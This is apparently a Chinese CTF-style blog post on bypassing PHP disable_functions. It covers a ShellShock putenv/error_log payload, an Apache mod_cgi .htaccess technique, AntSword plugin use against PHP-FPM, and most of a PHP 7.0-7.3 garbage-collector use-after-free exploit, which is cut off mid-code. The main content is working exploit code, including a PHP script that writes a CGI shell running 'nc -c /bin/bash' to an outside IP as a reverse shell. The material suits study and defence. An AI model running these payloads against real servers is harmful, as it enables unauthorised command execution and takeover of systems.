<p>根据 <a class="link"   href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2" >利用 ShellShock (CVE-2014-6271) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中的内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230826220107280.png"
                      alt="image-20230826220107280"
                ></p>
<p>首先，&#x2F;bin&#x2F;bash 要存在 CVE-2014-6271 漏洞。其次，需要&#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;bash sh 默认的 shell 是 bash。error_log函数正好执行了sh，因此可以用来触发shellshock漏洞。因此我们先在目录下创建一个shell.php文件，写入如下内容，并直接访问（所以文件需要放在&#x2F;var&#x2F;www&#x2F;html 下，本漏洞需求太多，显得鸡肋）：</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>上传 payload 到 &#x2F;var&#x2F;www&#x2F;html 下，并访问。</p>
<p><strong>koishi.php</strong> </p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_Koishi=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/answer.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>注意的是，putenv里的环境变量，()和{中间必须有空格，而且{和:中间也必须有空格，不然就会出错，env的前面必须要加上 PHP ，不然不会执行。</p>
<h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h3><p>这里需要用到.htaccess和mod_cgi</p>
<p><strong>1）.htaccess</strong></p>
<p>在文件上传中我们已经很熟悉了，具体介绍百度。</p>
<p>一般情况下，不应该使用.htaccess文件，除非你对主配置文件没有访问权限；.htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下。如果服务器管理员不愿意频繁修改配置，则可以允许用户通过.htaccess文件自己修改配置，尤其是ISP在同一个机器上运行了多个用户站点，而又希望用户可以自己改变配置的情况下。</p>
<p><strong>2）mod_cgi</strong></p>
<p>在非线程型MPM(<code>prefork</code>)上提供对CGI脚本执行的支持</p>
<p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中</p>
<p>参考apache手册：<code>https://www.php.cn/manual/view/17782.html#env</code></p>
<p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p>
<p>需要满足几个条件:</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="code"><pre><span class="line">第一，必须是apache环境</span><br><span class="line">第二，mod_cgi已经启用</span><br><span class="line">第三，必须允许<span class="selector-class">.htaccess</span>文件，也就是说在httpd<span class="selector-class">.conf</span>中，要注意AllowOverride选项为<span class="attribute">All</span>，而不是<span class="attribute">none</span></span><br><span class="line">第四，必须有权限写<span class="selector-class">.htaccess</span>文件</span><br></pre></td></tr></table></figure></div>

<p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p>
<p>做法有两种，要么直接利用蚁剑的插件，要么手动实现。</p>
<h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><p>例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccess内容：</span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .koishi			#这里的.koishi是我构造的，表示.koishi后缀的文件都会被当作cgi脚本执行</span><br><span class="line"></span><br><span class="line">shell.koishi</span><br><span class="line">#!/bin/sh</span><br><span class="line">echo&amp;&amp;cd &quot;/var/www/html&quot;;ls -al;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure></div>



<p>Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。 关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：<a class="link"   href="http://www.365mini.com/page/apache-options-directive.htm" >http://www.365mini.com/page/apache-options-directive.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本。</p>
<h3 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h3><p>首先写一个.htaccess，内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .koishi</span><br></pre></td></tr></table></figure></div>

<p>然后写一个 <strong><code>shell.koishi</code></strong> 内容如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&quot;Content-Type: text/html\n\n&quot;</span></span><br><span class="line"><span class="built_in">echo</span>&amp;<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p>直接执行命令好像可以不需要第二行，但是如果是shell反弹就需要有第二行，不然会出现500：</p>
<p>其实可以直接利用已有的exp，内容如下：</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;nc -c &#x27;/bin/bash&#x27; 10.11.12.13 8888&quot;</span>; <span class="comment">//command to be executed</span></span><br><span class="line"><span class="variable">$shellfile</span> = <span class="string">&quot;#!/bin/bash\n&quot;</span>; <span class="comment">//using a shellscript</span></span><br><span class="line"><span class="variable">$shellfile</span> .= <span class="string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line"><span class="variable">$shellfile</span> .= <span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span>(<span class="params"><span class="variable">$text</span>,<span class="variable">$condition</span>,<span class="variable">$yes</span>,<span class="variable">$no</span></span>) //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$text</span>: &quot;</span> . (<span class="variable">$condition</span> ? <span class="variable">$yes</span> : <span class="variable">$no</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;checked&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] . <span class="string">&#x27;?checked=true&#x27;</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$modcgi</span> = <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;mod_cgi&#x27;</span>, <span class="title function_ invoke__">apache_get_modules</span>()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">    <span class="variable">$writable</span> = <span class="title function_ invoke__">is_writable</span>(<span class="string">&#x27;.&#x27;</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">    <span class="variable">$htaccess</span> = !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTACCESS&#x27;</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Mod-Cgi enabled&quot;</span>,<span class="variable">$modcgi</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Is writable&quot;</span>,<span class="variable">$writable</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;htaccess working&quot;</span>,<span class="variable">$htaccess</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$modcgi</span> &amp;&amp; <span class="variable">$writable</span> &amp;&amp; <span class="variable">$htaccess</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="comment">//abort if not</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Backing up .htaccess&quot;</span>,<span class="title function_ invoke__">copy</span>(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.htaccess.bak&quot;</span>),<span class="string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Write .htaccess file&quot;</span>,<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Write shell file&quot;</span>,<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.dizzle&#x27;</span>,<span class="variable">$shellfile</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//write the file</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Chmod 777&quot;</span>,<span class="title function_ invoke__">chmod</span>(<span class="string">&quot;shell.dizzle&quot;</span>,<span class="number">0777</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//rwx</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="comment">//call the script</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>手动麻烦，就不使用了，直接使用蚁剑的工具吧。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230826224559160.png"
                      alt="image-20230826224559160"
                ></p>
<p>进去后选择 apache_mod_cgi 后点击开始即可生成 shell。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230826224637399.png"
                      alt="image-20230826224637399"
                ></p>
<h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><a class="link"   href="https://juejin.im/post/6844903471976546311" >Nginx+Php-fpm 运行原理详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true" >攻击PHP-FPM 实现Bypass Disable Functions <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record" >Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>个人编写攻击脚本较为复杂，建议直接使用蚁剑插件。蚁剑插件和上面那个一样的，换个选项就行。</p>
<p><strong>exp脚本在这</strong>：<a class="link"   href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" >Fastcgi PHP-FPM Client &amp;&amp; Code Execution (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 兼容 Python2 和 Python3，方便在内网用。</p>
<h2 id="payload-–-蚁剑"><a href="#payload-–-蚁剑" class="headerlink" title="payload – 蚁剑"></a>payload – 蚁剑</h2><p>地址需要选择一下，不然打不通，这题选择的是 localhost:9000，有时候是127.0.0.1:9000</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230827170551409.png"
                      alt="image-20230827170551409"
                ></p>
<p>成功后会在web根目录上传一个文件，名为 .antproxy.php 。</p>
<p>然后访问这个文件，连接密码是 ant </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230827171251913.png"
                      alt="image-20230827171251913"
                ></p>
<p>连上后，就可以任意执行shell命令了。</p>
<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>懒得学原理了，这边的知识都是涉及pwn二进制的内容，学不了一点。可以参考下面的内容。</p>
<p><a class="link"   href="https://cloud.tencent.com/developer/article/1944129" >干货 | 突破disable_functions限制执行命令·下-腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p><strong>历史报告</strong> <a class="link"   href="https://bugs.php.net/bug.php?id=72530" >PHP :: Bug #72530 :: Use After Free in GC with Certain Destructors <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>exp：</strong> <a class="link"   href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" >exploits&#x2F;php7-gc-bypass at master · mm0r1&#x2F;exploits (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) 